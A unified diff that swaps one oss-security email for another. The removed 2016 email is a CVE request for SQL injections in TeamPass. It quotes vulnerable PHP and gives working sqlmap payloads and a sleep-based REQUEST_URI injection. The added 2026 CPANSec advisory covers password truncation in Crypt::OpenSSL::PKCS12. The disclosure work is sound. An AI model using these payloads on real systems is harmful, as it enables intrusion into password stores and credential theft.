@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["6398" "Monday" "11" "July" "2016" "11:14:02" "+0800" "das das" "scusec2010@gmail.com" "<CAAjTPb_5q38hwdLzjNP+ejfhLvpNP7ny_tzCGF9diJf1zh1Pxw@mail.gmail.com>" "153" "[oss-security] CVE request:SQL injections in TeamPass" nil nil nil "7" "2016071103:14:02" "[oss-security] CVE request:SQL injections in TeamPass" (number mark "U       scusec2010@g Jul 11  153/6398  " thread-indent "\"[oss-security] CVE request:SQL injections in TeamPass\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 13922 invoked by uid 550); 11 Jul 2016 03:24:38 -0000
+Received: (qmail 13732 invoked by uid 550); 17 May 2026 19:54:13 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,191 +7,79 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 8132 invoked from network); 11 Jul 2016 03:14:15 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20120113;
-        h=mime-version:from:date:message-id:subject:to
-         :content-transfer-encoding;
-        bh=u8Bfwo1xn2ndIMtnSJJBZ5qaw4CP7F8S0W3I3jR2e7s=;
-        b=oGA8FCkHoLvNKZPaibQmKiLwfa5TJDpgVRXyq9rhPHn5HLIsS9qprD5w9O2tq2l7gA
-         a+5y3G2eHvYIBhgFmSu/JHv5SqnimgA8zpQkpF1mZ+mt6RqTySOYAJzYI9vnEA9z82IL
-         zSBNT2wmTFSiGczak+wEvG65eXi82pMGDs6WJCJV1QVN62x270OjGLX+3jXeWXBDOstu
-         jQ1dAuUQ8sD6l/ShbCB0RiasDOUZuUaw3XkUXKMGT+qZ3WHPnrrdAexEOKc86VimlE0C
-         UVB6VdN0B3ztmjGzqEVJ1t08q3hM2hpsgDnCaR8yvx2dzgLpsJB5AIQi2Gm4hZuEDLsM
-         VkXw==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20130820;
-        h=x-gm-message-state:mime-version:from:date:message-id:subject:to
-         :content-transfer-encoding;
-        bh=u8Bfwo1xn2ndIMtnSJJBZ5qaw4CP7F8S0W3I3jR2e7s=;
-        b=VQoUJ6Ai5UFb0bz+WYSJg+dq5dQZPhgfTshwJuVEVU81kaKJ+0pZOek5/O1wlm3ebo
-         CxWJle5Zk7qphG7H3+qjC/FoLhHaa9LtvCf79r0BXHLkpUpNF7TLeiuxKWatvMBSRR38
-         O0Lw/WPsW+UknSVjhU4L6PpIM4QRUFduJn8dktYi1WaZO/mfKLHdtaJkE69VjUvb9ABK
-         7TQhTUE21ZnlgpDS5/1mixCHFEEdbodRTmQFEALsmECTWZ+D98sRaaSc0mASJg0QK3wp
-         bJmJgxzPRyR/wlLLRjuQSwteFo6WieMByH0yaEKXDeh2MySC/91g5X2fN8OYgQRnYu7x
-         pWJA==
-X-Gm-Message-State: ALyK8tIdPvkh8ZtOV78BcMCCfBwUqS//UEiHN19jAWPMditLKkhgt/YeCxW3DXcm/7uiGhoqAUakkwLRzNHbmQ==
-X-Received: by 10.157.33.125 with SMTP id l58mr9412742otd.32.1468206843112;
- Sun, 10 Jul 2016 20:14:03 -0700 (PDT)
+x-ms-reactions: disallow
+Received: (qmail 7956 invoked from network); 17 May 2026 18:50:56 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=cpansec.org; s=gm1;
+	t=1779043847;
+	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
+	 to:to:cc:mime-version:mime-version:content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding;
+	bh=fTxul90MIPxU7xuyHqX+YmYGW+v3v5tdBt1M4aKClCw=;
+	b=jBlzy33pa8I4EFgOui88LgqupqwJohT1FJW+BR/yKKC5i3MsP+jroSqNPH/rC3AUjecQ76
+	XnlhIGoF2H6kPuEtci0/TO1tjWJq9jqitjWwbVy0qY3RAyR+dVafexOG4WYXFn1Tkg8cdY
+	yApDo/JNOfeGCi0esU2KDT/iNdfsTyaU0j+qDvdOA/i8sgaf+NLfe9PNllwz/DXwbTzFog
+	2YOjnQb3XwL/C9n//Z/NxQcxfChIkBQ2TE7coVPA9ac10uPE8YFkmuuZAbRrRyyrlpyXaL
+	mlLeF0wswiFRXtPkbRuKs6k6fsyaem1aL5YSueGm10LDZRBhmoJLgmbBN+FIlw==
 MIME-Version: 1.0
-From: das das <scusec2010@gmail.com>
-Date: Mon, 11 Jul 2016 11:14:02 +0800
-Message-ID: <CAAjTPb_5q38hwdLzjNP+ejfhLvpNP7ny_tzCGF9diJf1zh1Pxw@mail.gmail.com>
-To: oss-security@lists.openwall.com
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: quoted-printable
-Subject: [oss-security] CVE request:SQL injections in TeamPass
+Date: Sun, 17 May 2026 15:50:47 -0300
+From: Timothy Legge <timlegge@cpansec.org>
+To: Cve Announce <cve-announce@security.metacpan.org>, Oss Security
+ <oss-security@lists.openwall.com>
+Message-ID: <804e09e7d8f96e8f3f16bc1c0c5b1fe2@cpansec.org>
+X-Sender: timlegge@cpansec.org
+Content-Type: text/plain; charset=US-ASCII;
+ format=flowed
+Content-Transfer-Encoding: 7bit
+X-GND-Sasl: timlegge@cpansec.org
+X-GND-State: clean
+X-GND-Score: -100
+X-GND-Cause: dmFkZTGDiIZmUoUPYJJwrdaeiUljckAlfYMyxk4QEkSl7UNkbg+L5YZ3X4rcthRVIzvVb4EeJ5JL4OOtC7zfm5lGxII1Q/ZW6xtW6IENEP/ZCnfndAUJK4QmOQxr+P8trbtFiCZ+y+Dqk0aKrlMb830Y/HnE1ToSb96sTm33YTKmD8QDCnRiTKyuAq3PXpE999LfNWONsS+aJwjR2zaerOKvIbCyTaGKbcsqp4gGSvjfwQyvlgYFmecobA6W7LrQrwqkQPL8WLGHQFV80IXaCRFWb6MEu9iw9BRd2rXvAPk/0KYrP2k7bDv/6KDOIyR8+wqHyiMIZCkdunuv7bJDVto6q+muVcLeDNairBfUGxiIOP7KuZGmMw+JSDsc2iR0IzrEeIqpDdkFxK52kzRb9obJqoEZNsnXLl9twMQHf+WEVgAe98T1eWRar5oLFoNxhA6BJQ0N47b5jx3TU0+9kkMxQAbw+R02rUQurPWEkBu/rRyRzYLc18FZ5UXoFEwcd8G1WbjvlSh08SHtivOaOtjp5GH3iWjybZE7oMorfnypWPuPubctY/b7haA5w0KZGAzhM6VL5acLOe/osYGkUXICq/cGA2YZaBWIsJbdD7ciy0IhtGoFWZn/TMj++9e3hnfLDvPoNVpCtPAY0HH01YCDTO0gdxKlZX6EG9xEIWBmdX9szA
+Subject: [oss-security] CVE-2026-8721: Crypt::OpenSSL::PKCS12 versions through 1.94 for Perl
+ truncates passwords with embedded NULLs
 
-Hello,
+========================================================================
+CVE-2026-8721                                        CPAN Security Group
+========================================================================
 
-I'd like to request CVE IDs for these issues. They were found in
-TeamPass(www.teampass.net).
-All the issues are found in TeamPass (2.1.26, 2.1.25, 2.1.24).
-fixed:https://github.com/nilsteampassnet/TeamPass/commit/7bf6c63c4727a6ba9d=
-65610e59ccbc25527a6fca
+         CVE ID:  CVE-2026-8721
+   Distribution:  Crypt-OpenSSL-PKCS12
+       Versions:  through 1.94
 
-Issues detail:
-#1: SQL injection vectors in sources/items.queries.php
-
--------------------------code_start TeamPass-2.1.26-------------------------
-case "send_email":
-            if ($_POST['key'] !=3D $_SESSION['key']) {
-                echo '[{"error" : "something_wrong"}]';
-                break;
-            } else {
-                if (!empty($_POST['content'])) {
-                    $content =3D explode(',', $_POST['content']);
-                }
-                // get links url
-                if (empty($_SESSION['settings']['email_server_url'])) {
-                    $_SESSION['settings']['email_server_url'] =3D
-$_SESSION['settings']['cpassman_url'];
-                }
-                if ($_POST['cat'] =3D=3D "request_access_to_author") {
-                    $dataAuthor =3D DB::queryfirstrow("SELECT
-email,login FROM ".prefix_table("users")." WHERE id=3D ".$content[1]);
-                    $dataItem =3D DB::queryfirstrow("SELECT label FROM
-".prefix_table("items")." WHERE id=3D ".$content[0]);
-                    $ret =3D @sendEmail(
-                        $LANG['email_request_access_subject'],
-                        str_replace(array('#tp_item_author#',
-'#tp_user#', '#tp_item#'), array(" ".addslashes($dataAuthor['login']),
-addslashes($_SESSION['login']), addslashes($dataItem['label'])),
-$LANG['email_request_access_mail']),
-                        $dataAuthor['email']
-                    );
-                } elseif ($_POST['cat'] =3D=3D "share_this_item") {
-                    $dataItem =3D DB::queryfirstrow("SELECT
-label,id_tree FROM ".prefix_table("items")." WHERE id=3D
-".$_POST['id']);
-                    // send email
-                    $ret =3D @sendEmail(
-                        $LANG['email_share_item_subject'],
-                        str_replace(
-                            array('#tp_link#', '#tp_user#', '#tp_item#'),
-
-array($_SESSION['settings']['email_server_url'].'/index.php?page=3Ditems&gr=
-oup=3D'.$dataItem['id_tree'].'&id=3D'.$_POST['id'],
-addslashes($_SESSION['login']), addslashes($dataItem['label'])),
-                            $LANG['email_share_item_mail']
-                        ),
-                        $_POST['receipt']
-                    );
-                }
-                echo '[{'.$ret.'}]';
-            }
-            break;
--------------------------code_end TeamPass-2.1.26--------------------------
-
-In the "send_email" request, when the condition "$_POST['cat'] =3D=3D
-"share_this_item"" is successful, the POST parameter "id" is unescaped
-which leads to sql injection. while is checks the sessions at the
-beginning of the script and needs the authority of normal user to
-access to the page. To execute the SQL query,it verifies that if the
-the post parameter'key' equals session['key'].We can get the key
-through thisway=EF=BC=9Arefresh the page(e.g index.php?page=3Ditems), captu=
-re
-the packet using tools (e.g Burp Suit), and forward the packet,then we
-canget the value of session 'key' in the request body.
-e.p
-http://localhost:8088/code_audit/TeamPass/sources/items.queries.php
-POST:
-type=3Dsend_email&key=3Dwiesu2Gae8shaeNgeengeiha2aic2ohghainia1laeyi9doh6G&=
-cat=3Dshare_this_item&id=3D1*
-Sqlmap payload:
-sqlmap identified the following injection point(s) with a total of 406
-HTTP(s) requests:
----
-Parameter: id (POST)
-    Type: boolean-based blind
-    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY
-or GROUP BY clause
-    Payload: type=3Dsend_email&key=3Dwiesu2Gae8shaeNgeengeiha2aic2ohghainia=
-1laeyi9doh6G&cat=3Dshare_this_item&id=3D1
-RLIKE (SELECT (CASE WHEN (7565=3D7565) THEN 1 ELSE 0x28 END))
-
-    Type: error-based
-    Title: MySQL >=3D 5.1 AND error-based - WHERE, HAVING, ORDER BY or
-GROUP BY clause (EXTRACTVALUE)
-    Payload: type=3Dsend_email&key=3Dwiesu2Gae8shaeNgeengeiha2aic2ohghainia=
-1laeyi9doh6G&cat=3Dshare_this_item&id=3D1
-AND EXTRACTVALUE(4196,CONCAT(0x5c,0x7162766271,(SELECT
-(ELT(4196=3D4196,1))),0x716b706271))
-
-    Type: AND/OR time-based blind
-    Title: MySQL <=3D 5.0.11 AND time-based blind (heavy query)
-    Payload: type=3Dsend_email&key=3Dwiesu2Gae8shaeNgeengeiha2aic2ohghainia=
-1laeyi9doh6G&cat=3Dshare_this_item&id=3D1
-AND 7783=3DBENCHMARK(5000000,MD5(0x44794d4a))
----
+       MetaCPAN:  https://metacpan.org/dist/Crypt-OpenSSL-PKCS12
+       VCS Repo:  https://github.com/dsully/perl-crypt-openssl-pkcs12
 
 
-#2: SQL injection vectors in
-includes/libraries/Database/Meekrodb/db.class.php
+Crypt::OpenSSL::PKCS12 versions through 1.94 for Perl truncates
+passwords with embedded NULLs
 
--------------------------code_start TeamPass-2.1.26-------------------------
-// ----- BEGIN ERROR HANDLING
-    if (!$sql || $db->error) {
-      if ($this->error_handler) {
-        $db_error =3D $db->error;
-        $db_errno =3D $db->errno;
-$db->query(
-"INSERT INTO ".$GLOBALS['pre']."log_system SET
-date=3D".time().",
-qui=3D".$_SESSION['user_id'].",
-label=3D'Query: ".addslashes($sql)."<br />Error:
-".addslashes($db_error)."<br />@ ".$_SERVER['REQUEST_URI']."',
-type=3D'error'",
-MYSQLI_USE_RESULT
-);
--------------------------code_end TeamPass-2.1.26--------------------------
-When a database error occurs, these codes above will be excuted.
-However, the variable "$_SERVER['REQUEST_URI']" is unescaped and
-controled by us which lead to a sql injection. First we need to find a
-place where database error occurs, such as
-"sources/import.queries.php". It needs a normal user authority to
-access to the page. Then use the burpsuit to access the page to avoid
-the urlencode by browsers.
-e.p
-http://localhost:8088/TeamPass/sources/import.queries.php?'or/**/sleep(5)/*=
-*/or'1
-POST:
-type=3Dimport_items&data=3D&folder=3D1
-And the sql log is as below. It is a time-based sql injection.
--------------------------log_start-------------------------
-Query INSERT INTO teampass_log_system SET
-date=3D1466674179,
-qui=3D10000001,
-label=3D'Query: INSERT INTO `teampass_items`
-(`label`,`description`,`pw`,`pw_iv`,`url`,`id_tree`,`login`,`anyone_can_mod=
-ify`)
-VALUES (\'\', NULL, \'\', \'dfd7c5279cdd697c08b627aeaaf15999\', NULL,
-\'1\', NULL, 0)<br />Error: Column \'description\' cannot be null<br
-/>@ /code_audit/TeamPass/sources/import.queries.php?'or/**/sleep(5)/**/or'1=
-',
-type=3D'error'
--------------------------log_end---------------------------
+Description
+-----------
+Crypt::OpenSSL::PKCS12 versions through 1.94 for Perl truncates
+passwords with embedded NULLs.
+
+Password parameters in PKCS12.xs are declared char *, which routes
+through Perl's default typemap to SvPV_nolen.  The Perl length is
+discarded.
+
+The C code (or OpenSSL internally) calls strlen() on the buffer.  Any
+password byte at or after the first NULL is silently dropped. Binary /
+KDF-derived / HMAC-derived passwords lose entropy without any warnings.
+
+Problem types
+-------------
+- CWE-170 Improper Null Termination
+
+Solutions
+---------
+Upgrade to 1.95 or later.
 
 
-These issues were discovered by wps2015[D.A.S] of Information Security
-Institute @ Sichuan University.
+References
+----------
+https://metacpan.org/release/JONASBN/Crypt-OpenSSL-PKCS12-1.95/view/Changes.md
+
+Timeline
+--------
+- 2026-05-13: CPANSec identified issue
+- 2026-05-13: Author was notified
+- 2026-05-17: Maintainer released patch version
